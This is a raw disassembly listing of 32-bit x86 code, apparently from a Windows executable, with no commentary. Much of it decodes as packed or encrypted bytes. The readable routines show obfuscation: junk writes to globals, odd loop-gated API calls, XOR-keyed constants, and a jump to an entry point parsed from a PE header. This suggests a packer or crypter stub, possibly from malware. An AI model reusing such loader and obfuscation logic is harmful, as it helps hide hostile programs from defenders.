  40619e:	add    BYTE PTR [edx+ecx*4],0xdc
  4061a2:	shl    DWORD PTR [ecx-0x23],0xa5
  4061a6:	neg    BYTE PTR [eax]
  4061a8:	retf   
  4061a9:	mov    ds:0x4a1c57db,eax
  4061ae:	xchg   cl,ah
  4061b0:	or     esi,ecx
  4061b2:	or     DWORD PTR [ebp+0x63],esp
  4061b5:	jge    0x40621a
  4061b7:	and    al,0x14
  4061b9:	fidiv  WORD PTR [edx+0x725a84c1]
  4061bf:	sub    edi,DWORD PTR [ebx-0x13fdf52c]
  4061c5:	xchg   ecx,eax
  4061c6:	xchg   edi,eax
  4061c7:	adc    al,0xa7
  4061ca:	les    ebx,FWORD PTR [ebx+0x25]
  4061cd:	jg     0x406238
  4061cf:	js     0x4061af
  4061d1:	shr    BYTE PTR [ecx],0x91
  4061d4:	jecxz  0x4061fe
  4061d6:	sub    BYTE PTR [ebx-0x779c88a5],ah
  4061dc:	jmp    0xc9eb:0xa496e19c
  4061e3:	inc    edx
  4061e4:	dec    edx
  4061e5:	enter  0x7da1,0x8a
  4061e9:	into   
  4061ea:	(bad)  
  4061eb:	xor    al,0xa9
  4061ed:	aam    0x3a
  4061ef:	loope  0x40624b
  4061f1:	leave  
  4061f2:	popa   
  4061f3:	jae    0x40624f
  4061f5:	test   DWORD PTR ds:0x9be9cf58,ecx
  4061fb:	cmp    eax,0xe6d7a9c4
  406200:	(bad)  
  406201:	jg     0x406278
  406203:	test   eax,0xbb872007
  406208:	jnp    0x4061e6
  40620a:	loopne 0x4061db
  40620c:	push   ecx
  40620d:	mov    esi,0xbdd1a76d
  406212:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406213:	out    dx,al
  406214:	in     al,0x31
  406216:	mov    ch,0x8e
  406218:	lods   al,BYTE PTR ds:[esi]
  406219:	mov    ecx,0x98bdd06
  40621e:	push   cs
  40621f:	mov    dl,0x73
  406221:	mov    al,0x9b
  406223:	xor    dh,BYTE PTR [edi-0x33]
  406226:	xor    eax,0x58dee84e
  40622b:	retf   
  40622c:	fcom   QWORD PTR [edi+0x39]
  40622f:	push   cs
  406230:	push   0xde6d146b
  406235:	popa   
  406236:	pop    es
  406237:	shl    BYTE PTR [esi],cl
  406239:	repnz inc ecx
  40623b:	and    edx,0x248a7706
  406241:	xchg   ecx,eax
  406242:	jb     0x406234
  406244:	push   es
  406245:	stc    
  406246:	lods   al,BYTE PTR ds:[esi]
  406247:	adc    DWORD PTR [ebx+0x82aba2],edx
  40624d:	jns    0x406221
  40624f:	cmp    eax,0x20405e1d
  406254:	(bad)  
  406255:	jbe    0x4062c4
  406257:	outs   dx,BYTE PTR ds:[esi]
  406258:	adc    bl,bl
  40625a:	mov    ch,0x2e
  40625c:	popf   
  40625d:	and    dl,dh
  40625f:	adc    DWORD PTR [edi],ebx
  406261:	push   eax
  406262:	loopne 0x406290
  406264:	xor    esi,eax
  406266:	and    DWORD PTR ds:0x4338a3,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x4338a3
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x4338a3,ecx
  406282:	cmp    DWORD PTR ds:0x4338a3,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x4338a3,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x4338a3,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x4338a3
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x4338a3,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	repz or DWORD PTR [esi-0x19],esi
  406315:	push   esp
  406316:	aas    
  406317:	jle    0x406397
  406319:	sub    al,0x7d
  40631b:	jle    0x40639b
  40631d:	(bad)  
  40631f:	addr16 push ecx
  406321:	add    esi,DWORD PTR [esp+eax*1]
  406324:	xor    eax,0x9e8066c0
  406329:	imul   esp,DWORD PTR [ecx-0x10cefd4f],0xb46391f1
  406333:	dec    esi
  406334:	push   ecx
  406335:	xchg   BYTE PTR [ecx-0x65fd7962],ah
  40633b:	xchg   esi,eax
  40633c:	mov    cl,0x49
  40633e:	into   
  40633f:	stos   DWORD PTR es:[edi],eax
  406340:	and    al,0x62
  406342:	dec    esi
  406343:	xchg   ebx,eax
  406344:	xchg   dl,dh
  406346:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406347:	js     0x40633c
  406349:	dec    esi
  40634a:	add    DWORD PTR [eax-0x3c],ebx
  40634d:	push   esi
  40634e:	outs   dx,DWORD PTR ds:[esi]
  40634f:	mov    eax,0x98840d60
  406354:	clc    
  406355:	dec    ebx
  406356:	stc    
  406357:	cdq    
  406358:	(bad)  
  406359:	pop    esi
  40635a:	push   0xffffff8a
  40635c:	pop    edi
  40635d:	jmp    0x40632f
  40635f:	sti    
  406360:	fnstenv [edx+edi*1-0x96a2cb]
  406367:	repnz mov eax,ds:0x341a02cc
  40636d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40636e:	es push esi
  406370:	ins    DWORD PTR es:[edi],dx
  406371:	int3   
  406372:	test   eax,0x238c2e99
  406377:	push   cs
  406378:	push   0x5e
  40637a:	fdivrp st(7),st
  40637c:	sub    edi,DWORD PTR [eax*2-0x5604feb1]
  406383:	xchg   ebx,eax
  406384:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406385:	dec    edx
  406386:	push   ebx
  406387:	push   eax
  406388:	mov    ah,0x4f
  40638a:	pop    edx
  40638b:	xchg   esi,eax
  40638c:	sbb    DWORD PTR [edi],0x4e
  40638f:	out    0x7a,al
  406391:	sub    al,0x63
  406393:	mov    cl,0xf5
  406395:	cmp    edx,DWORD PTR [ebx-0x2564c028]
  40639b:	sbb    eax,DWORD PTR [esi+ecx*8+0x6f571c54]
  4063a2:	xor    ecx,DWORD PTR [ebx-0x33be2dc4]
  4063a8:	outs   dx,DWORD PTR ds:[esi]
  4063a9:	fild   QWORD PTR [ebx-0x52a57f05]
  4063af:	mov    al,0x48
  4063b1:	mov    esp,0x142cdfec
  4063b6:	jp     0x4063d5
  4063b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063b9:	push   ecx
  4063ba:	and    ebx,DWORD PTR [edi-0x318ce8f2]
  4063c0:	xchg   ecx,eax
  4063c1:	push   edi
  4063c2:	mov    dl,BYTE PTR [edx]
  4063c4:	addr16 pop edi
  4063c6:	mov    eax,ds:0x39d15390
  4063cb:	fs loopne 0x406437
  4063ce:	lea    esi,[ecx]
  4063d0:	jno    0x406386
  4063d2:	stc    
  4063d3:	push   ebx
  4063d4:	cmp    ebp,ebx
  4063d6:	sub    edi,DWORD PTR [edx+ebx*2-0x80]
  4063da:	call   0xf280:0xf3a6c46f
  4063e1:	mov    bh,0x79
  4063e3:	jbe    0x406388
  4063e5:	scas   al,BYTE PTR es:[edi]
  4063e6:	lds    ebp,FWORD PTR [esi-0x41]
  4063e9:	sbb    al,BYTE PTR [edx+eiz*2-0x4b]
  4063ed:	hlt    
  4063ee:	ja     0x4063f6
  4063f0:	ja     0x4063ad
  4063f2:	ja     0x40644b
  4063f4:	xrelease mov DWORD PTR [eax+0x67],0x6289b62f
  4063fc:	push   ds
  4063fd:	into   
  4063fe:	and    al,BYTE PTR [ebx+edx*1]
  406401:	jg     0x406391
  406403:	stos   DWORD PTR es:[edi],eax
  406404:	push   es
  406405:	xchg   BYTE PTR [ebx-0x53],bl
  406408:	push   ebp
  406409:	cmc    
  40640a:	mov    al,ds:0x901d8e3c
  40640f:	repnz or eax,0xab932053
  406415:	clc    
  406416:	shl    ebp,1
  406418:	inc    esi
  406419:	pop    eax
  40641a:	add    ah,dl
  40641c:	mov    al,0x91
  40641e:	mov    dl,0xa4
  406420:	aas    
  406421:	imul   esi,DWORD PTR [eax+eiz*1],0xfc7b1c80
  406428:	mov    esp,DWORD PTR [ebx+0x694fd9a6]
  40642e:	or     BYTE PTR [edx],al
  406430:	xchg   edx,eax
  406431:	mov    ds:0xb7e55f05,al
  406436:	jnp    0x406446
  406438:	call   0x28e0ec1e
  40643d:	(bad)
  406440:	jmp    0x4063fe
  406442:	xchg   esi,eax
  406443:	repz mov bl,0x12
  406446:	loopne 0x4063cd
  406448:	out    0xdd,al
  40644a:	cwde   
  40644b:	cmp    BYTE PTR ds:0x9a87432c,al
  406451:	jle    0x40649e
  406453:	pop    ss
  406454:	in     eax,dx
  406455:	iret   
  406456:	push   esp
  406457:	call   0xda31f16c
  40645c:	sbb    cl,BYTE PTR gs:[ecx]
  40645f:	enter  0xa388,0x7b
  406463:	mov    al,0x28
  406465:	add    DWORD PTR ds:0xa79b6a49,0x3c341e4b
  40646f:	sbb    DWORD PTR [edi-0x5bcba757],ebx
  406475:	pop    edi
  406476:	xchg   edi,ebx
  406478:	addr16 push eax
  40647a:	cwde   
  40647b:	in     al,dx
  40647c:	cld    
  40647d:	jae    0x4064c0
  40647f:	pop    edi
  406480:	vmread DWORD PTR [edi],edi
  406483:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406484:	jno    0x4064fd
  406486:	out    0x73,eax
  406488:	xor    edi,eax
  40648a:	sub    eax,DWORD PTR [edx-0x1b]
  40648d:	add    eax,0xbfa8d305
  406492:	cmp    eax,0x61536ff8
  406497:	stc    
  406498:	inc    edx
  406499:	mov    esi,0xfbcc96af
  40649e:	arpl   WORD PTR [esi],sp
  4064a0:	xchg   DWORD PTR es:[ebp+ecx*2+0x6df9f60f],ebx
  4064a8:	inc    ebx
  4064a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064aa:	mov    eax,0x2f6d9dcc
  4064af:	test   BYTE PTR [ebp+0x24],ah
  4064b2:	add    al,0xb8
  4064b4:	sub    esp,esp
  4064b6:	sub    al,cl
  4064b8:	mov    al,ds:0x5f1d6438
  4064bd:	scas   al,BYTE PTR es:[edi]
  4064be:	dec    ebp
  4064bf:	pop    esp
  4064c0:	adc    BYTE PTR [edx+0x60],cl
  4064c3:	bswap  ebx
  4064c5:	test   eax,0x5899378d
  4064ca:	xchg   DWORD PTR [edi+0xd509f43],ecx
  4064d0:	pop    ebp
  4064d1:	jne    0x4064f8
  4064d3:	clc    
  4064d4:	lds    edx,FWORD PTR [ebx]
  4064d6:	popa   
  4064d7:	mov    eax,0xdd620d7f
  4064dc:	dec    edx
  4064dd:	shl    al,0x6a
  4064e0:	push   ss
  4064e1:	(bad)  
  4064e3:	out    dx,al
  4064e4:	and    al,0xa7
  4064e6:	lds    ebp,FWORD PTR [ecx]
  4064e8:	jl     0x406477
  4064ea:	adc    eax,0x862aa9da
  4064ef:	loope  0x4064ad
  4064f1:	sub    BYTE PTR [ebp-0x1304a2e6],0x6f
  4064f8:	addr16 mov al,ds:0xad2d
  4064fc:	or     al,0x67
  4064fe:	mov    ch,0x94
  406500:	pop    ebx
  406501:	push   ebx
  406502:	pushf  
  406503:	cmp    al,0xcb
  406505:	add    dh,BYTE PTR [ebx]
  406507:	xor    al,0x7b
  406509:	adc    eax,esp
  40650b:	push   ebx
  40650c:	ins    BYTE PTR es:[edi],dx
  40650d:	retf   
  40650e:	sbb    cl,dl
  406510:	clc    
  406511:	xlat   BYTE PTR ds:[ebx]
  406512:	and    eax,0x4a83b2f3
  406517:	inc    esi
  406518:	adc    BYTE PTR es:[esi],bl
  40651b:	popa   
  40651c:	fst    QWORD PTR [ebx-0x1007c40b]
  406522:	xor    DWORD PTR [edi+0x79],0x7b03ba84
  406529:	test   BYTE PTR [ecx+0x15],bh
  40652c:	pop    es
  40652d:	mov    BYTE PTR [edi-0x155aeea0],ch
  406533:	mov    al,0x17
  406535:	neg    BYTE PTR ds:0xba10762b
  40653b:	or     eax,0xb37b2d02
  406540:	push   edx
  406541:	dec    ecx
  406542:	pop    ebx
  406543:	xor    al,0x93
  406545:	imul   ebx,edi,0x6f19672c
  40654b:	xchg   DWORD PTR [esi],edi
  40654d:	mov    bh,0xcf
  40654f:	add    DWORD PTR [eax],esp
  406551:	and    dl,ch
  406553:	mov    al,0x51
  406555:	xchg   ebp,eax
  406556:	or     DWORD PTR ds:0x9322917,esp
  40655c:	cmp    BYTE PTR [edi],ah
  40655e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40655f:	and    edi,DWORD PTR gs:[ebx]
  406562:	xchg   BYTE PTR [edx+0x2cef77ef],dl
  406568:	push   ss
  406569:	(bad)  
  40656a:	aam    0x1d
  40656c:	jno    0x406508
  40656e:	add    al,0xef
  406570:	gs or  al,0x6d
  406573:	xor    ah,BYTE PTR [eax-0x54]
  406576:	hlt    
  406577:	xchg   BYTE PTR es:[edx],ah
  40657a:	mov    DWORD PTR [esi+ebp*8],ebp
  40657d:	repz sbb eax,0x7049c630
  406583:	push   edx
  406584:	pop    edi
  406585:	xchg   ebp,eax
  406586:	sbb    eax,DWORD PTR [ecx-0x4f470f03]
  40658c:	inc    ebp
  40658d:	and    al,0x1d
  40658f:	(bad)  
  406590:	jns    0x4065ff
  406592:	dec    ebx
  406593:	mov    edi,edx
  406595:	xor    ah,ch
  406597:	sahf   
  406598:	and    esi,DWORD PTR [eax+edx*1-0x3b]
  40659c:	sahf   
  40659d:	or     edx,DWORD PTR [eax+0x6b5e9d11]
  4065a3:	xor    BYTE PTR [edx+0x341a939b],al
  4065a9:	mov    bh,0xd9
  4065ab:	dec    ebp
  4065ac:	out    0xf,eax
  4065ae:	xchg   ebp,eax
  4065af:	lock mov si,cx
  4065b3:	inc    ecx
  4065b4:	pop    esp
  4065b5:	push   ecx
  4065b6:	hlt    
  4065b7:	cli    
  4065b8:	stos   BYTE PTR es:[edi],al
  4065b9:	sub    edi,edx
  4065bb:	shr    DWORD PTR [edi+0x40],cl
  4065be:	ret    
  4065bf:	pop    ds
  4065c0:	ret    0xa523
  4065c3:	add    eax,0x8b16ec9c
  4065c8:	xchg   esi,eax
  4065c9:	mov    ds:0x2fcdc533,eax
  4065ce:	test   ch,dh
  4065d0:	ins    BYTE PTR es:[di],dx
  4065d2:	push   ebp
  4065d3:	jge    0x406641
  4065d5:	cmp    al,0x7c
  4065d7:	mov    DWORD PTR ss:[esi+0x9],0xf829bd9
  4065df:	lods   al,BYTE PTR ds:[esi]
  4065e0:	fs out dx,eax
  4065e2:	aaa    
  4065e3:	cmp    ch,0xa
  4065e6:	inc    eax
  4065e7:	mov    ds:0xc3b48054,al
  4065ec:	dec    ecx
  4065ed:	pop    esp
  4065ee:	add    al,0xc5
  4065f0:	pop    ebp
  4065f1:	xchg   edi,eax
  4065f2:	mov    cl,0xc6
  4065f4:	loop   0x406622
  4065f6:	xchg   BYTE PTR [edi-0x4f],cl
  4065f9:	cwde   
  4065fa:	mov    eax,0x5284e679
  4065ff:	adc    BYTE PTR [edi],0x45
  406602:	(bad)  [ebp+0x4c344ab1]
  406608:	push   0x13b94f50
  40660d:	or     ch,ah
  40660f:	sub    eax,DWORD PTR [ebx]
  406611:	adc    eax,0xe1917779
  406616:	dec    edx
  406617:	add    al,0x39
  406619:	leave  
  40661a:	sti    
  40661b:	inc    ebp
  40661d:	inc    esp
  40661e:	or     ch,bl
  406620:	fiadd  WORD PTR [esi-0x31]
  406623:	mov    dh,dl
  406625:	mov    eax,cs
  406627:	adc    al,0x66
  406629:	add    eax,0xaf34034
  40662e:	adc    al,0x33
  406630:	ret    0x16e3
  406633:	jl     0x406652
  406635:	jno    0x406610
  406637:	xchg   ecx,eax
  406638:	or     al,0x9a
  40663a:	mov    WORD PTR [ebp-0x700aa393],fs
  406640:	mov    esp,0x480dd4e7
  406645:	xchg   BYTE PTR [esi-0x2a9a9ea3],bl
  40664b:	or     eax,0xff3d1fe4
  406650:	shr    cl,1
  406652:	add    eax,DWORD PTR [eax]
  406654:	add    BYTE PTR [eax],al
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x43377b,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x433853,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x433827,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x433863,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x433863
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x433863,ecx
  4066d8:	cmp    DWORD PTR ds:0x433863,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433983
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x433863,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x433863
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x433863,ecx
  406714:	cmp    DWORD PTR ds:0x433863,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x433857
  406728:	and    ecx,DWORD PTR ds:0x43378f
  40672e:	mov    DWORD PTR ds:0x433857,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43379b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x4338ab
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433793,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x4337eb,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433787,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433787
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433787,ebx
  40677d:	cmp    DWORD PTR ds:0x433787,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433787,0x23
  406791:	jne    0x4067a7
  406797:	push   0x4339b3
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x43382b,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433817,0x433827
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x433853
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x4337eb,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433793,0x43381f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433787,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x43382f
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x433863
  40683c:	and    DWORD PTR ds:0x433827,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x4338ab
  40684d:	or     DWORD PTR ds:0x433863,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x4337db,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43389f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x43382b
  406870:	sub    DWORD PTR ds:0x433853,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43378b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433787,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433793,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43378f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x4337a3,0x4338ab
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43381b,0x43385f
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x433867,0x433813
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x4337d3,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x4337db,0x43386f
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x43382b,0x4337ef
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x4337db,0x43381b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x43377b
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x43377b,0x4337a3
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x43385b
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x43377f,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x43386f,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43389b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43389b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43389b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43389b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43389b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433817
  4069db:	adc    ecx,DWORD PTR ds:0x4337df
  4069e1:	mov    DWORD PTR ds:0x433817,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433813,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x4337e7,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433813,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43378f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43381b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43379b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x433853,0x29a7
